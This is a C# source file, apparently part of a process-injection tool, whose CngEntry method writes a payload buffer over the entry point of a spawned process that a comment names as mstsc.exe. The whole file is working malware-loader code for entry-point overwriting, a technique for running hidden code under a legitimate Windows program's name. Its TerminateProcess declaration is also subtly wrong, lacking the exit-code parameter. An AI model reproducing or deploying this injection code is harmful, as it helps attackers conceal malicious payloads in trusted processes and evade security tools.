using System;
using System.Runtime.InteropServices;
using MakeProc;

namespace MoveCode
{
    public static class MoveInto
    {
        [DllImport("kernel32.dll")]
        static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateProcess(IntPtr hProcess);

        [DllImport("kernel32.dll")]
        public static extern uint GetLastError();

        public static void CngEntry(PROCESS_INFORMATION procInfo, IntPtr InitialEntry, byte[] buf) 
        {
            // Copy code to mstsc.exe entrypoint:
            IntPtr outSize;
            int movePld = WriteProcessMemory(procInfo.hProcess, InitialEntry, buf, buf.Length, out outSize);
            if (movePld == 0)
            {
                Console.WriteLine("Couldn't move payload to new memory address:" + GetLastError());
                TerminateProcess(procInfo.hProcess);
                Environment.Exit(1);
            }
            return;
        }
    }
}
